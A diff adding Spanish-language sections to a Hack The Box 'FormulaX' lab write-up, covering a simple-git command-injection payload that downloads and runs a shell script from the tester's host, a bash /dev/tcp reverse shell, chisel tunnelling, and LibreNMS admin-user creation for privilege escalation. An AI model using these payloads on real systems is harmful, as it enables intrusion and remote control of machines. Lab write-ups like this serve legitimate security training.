@@ -1,4 +1,4 @@
----
+![image](https://github.com/m0rd3caii/m0rd3cai.github.io/assets/142639542/bb8f7818-55a8-4155-8d7a-cb611ccc0300)---
 layout: single
 title: FormulaX - Hack The Box
 excerpt: "Descripcion"
@@ -150,3 +150,153 @@ Vamoss..Tenemos lo que parece el historial de algun chat!!
 "OPTIONS /?Write a script to automate the auto-update
 ```
 Un subdominio? eso parece.. vamos a echar un vistazo
+
+Primero lo añadimos al /etc/hosts:
+```ruby
+❯ cat /etc/hosts | head -n 3
+127.0.0.1       localhost
+127.0.1.1       kali
+10.129.188.227 dev-git-auto-update.chatbot.htb
+```
+Podemos ver que esta utilizando el software de simple-git hmm... Vamos a ver como funciona por detras. 
+
+```Made with ❤ by Chatbot🤖 Using simple-git v3.14```
+![](../assets/images/htb-writeup-formulax/gitsub.PNG)
+
+Buscando un poco he podido encontrar un recurso que podria ser de ayuda:
+[https://security.snyk.io/vuln/SNYK-JS-SIMPLEGIT-3112221](https://security.snyk.io/vuln/SNYK-JS-SIMPLEGIT-3112221)
+
+Vamos a probar a hacer una reverse shell:
+
+Payload
+
+``` ext::sh -c curl% http://10.10.14.25:9000/shell.sh|bash >&2 ```
+
+Reverse shell file
+
+```
+       │ File: shell.sh
+───────┼────────────────────────────────────────────────────────────────────────────────────────────────────────────
+   1   │ bash -i >& /dev/tcp/10.10.14.X/4444 0>&1
+```
+
+Abre un http server con python y manda el payload.
+
+```ruby
+❯ python3 -m http.server 9000
+Serving HTTP on 0.0.0.0 port 9000 (http://0.0.0.0:9000/) ...
+10.129.188.227 - - [10/Mar/2024 14:21:55] "GET /shell.sh HTTP/1.1" 200 -
+```
+
+Perfecto ya tenemos una shell!
+
+![](../assets/images/htb-writeup-formulax/user1.PNG)
+
+Lo siguiente que podemos hacer es enumerar todo con linpeas o manualmente.
+
+Si entramos en el siguiente directorio veremos un script que parece ser para una BD de mongoDB esto nos esta dando ya pistas de lo que podemos encontrar.
+
+```ruby
+www-data@formulax:~/automation$ cat db_script.sh 
+#! /bin/bash
+echo "db.users.remove({value:false})" | mongo testing --quiet
+www-data@formulax:~/automation$ 
+```
+Si utilizamos la base de datos podemos listar las tablas y el contenido:
+
+![](../assets/images/htb-writeup-formulax/mongoDB.PNG)
+
+**USER FLAG**
+
+Hmm solo se pudo crackear el usuario frank, vamos a autenticarnos con ssh:
+
+![](../assets/images/htb-writeup-formulax/user2.PNG)
+
+Si enumeramos bien podemos ver diferentes cosas que no son normales:
+```ruby
+frank_dorky@formulax:~$ ss -tulpn | grep 3000
+tcp   LISTEN 0      511        127.0.0.1:3000       0.0.0.0:* 
+```
+si hacemos curl podemos ver que es un login de un servicio "librenms":
+```ruby
+frank_dorky@formulax:~$ curl http://localhost:3000
+<!DOCTYPE html>
+<html>
+    <head>
+        <meta charset="UTF-8" />
+        <meta http-equiv="refresh" content="0;url='http://localhost:3000/login'" />
+
+        <title>Redirecting to http://localhost:3000/login</title>
+    </head>
+    <body>
+        Redirecting to <a href="http://localhost:3000/login">http://localhost:3000/login</a>.
+    </body>
+</html>
+```
+Hmm al tenerlo en localhost tendremos que hacer portforwarding para que podamos ver la interfaz WEB:
+
+Para esto utilizaremos chisel:
+
+```ruby
+❯ ./chisel server --reverse -p 8000
+2024/03/10 15:05:51 server: Reverse tunnelling enabled
+2024/03/10 15:05:51 server: Fingerprint IwcXlLjjhGRFEtdQCwjX1NjTnAFDhlvdmNs2jKKj4BU=
+2024/03/10 15:05:51 server: Listening on http://0.0.0.0:8000
+2024/03/10 15:05:58 server: session#1: tun: proxy#R:3000=>3000: Listening
+```
+```ruby
+frank_dorky@formulax:~$ ./chisel client 10.10.14.25:8000 R:3000:127.0.0.1:3000
+2024/03/10 14:06:01 client: Connecting to ws://10.10.14.25:8000
+2024/03/10 14:06:02 client: Connected (Latency 103.900738ms)
+```
+
+Ahora ya podemos acceder con nustro localhost:3000.
+
+![](../assets/images/htb-writeup-formulax/libre1.PNG)
+
+Tras intentos de usuarios y contraseñas he encontrado un recurso donde explican como crear usuarios como admin:
+
+[https://community.librenms.org/t/adding-admin-users-on-librenms/20782](https://community.librenms.org/t/adding-admin-users-on-librenms/20782)
+
+Vamos a probarlo:
+
+```ruby
+frank_dorky@formulax:/opt/librenms$ /opt/librenms/adduser.php test 1234 10
+User test added successfully
+frank_dorky@formulax:/opt/librenms$ 
+```
+Perfecto tenemos login!!
+
+![](../assets/images/htb-writeup-formulax/libre2.PNG)
+
+Tras mirar un poco todo he encontrado en global settings los paths de los binarios, si modificamos estos por un revershell tendriamos que tener una shell inversa.
+
+![](../assets/images/htb-writeup-formulax/libre3.PNG)
+
+Tras darle a validar configuracion se te dara una reverse shell.
+
+```ruby
+❯ nc -lvnp 4444
+listening on [any] 4444 ...
+connect to [10.10.14.25] from (UNKNOWN) [10.129.188.227] 33846
+bash: cannot set terminal process group (937): Inappropriate ioctl for device
+bash: no job control in this shell
+librenms@formulax:~/html$ 
+```
+
+Vamos tenemos las credenciales del usuario kai!
+
+![](../assets/images/htb-writeup-formulax/libre4.PNG)
+
+Si nos autentificamos con kai podemos ver que puede ejecutar un script como sudo:
+```ruby
+kai_relay@formulax:~$ sudo -l
+Matching Defaults entries for kai_relay on forumlax:
+    env_reset, timestamp_timeout=0, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty, env_reset, timestamp_timeout=0
+
+User kai_relay may run the following commands on forumlax:
+    (ALL) NOPASSWD: /usr/bin/office.sh
+kai_relay@formulax:~$ 
+```
+
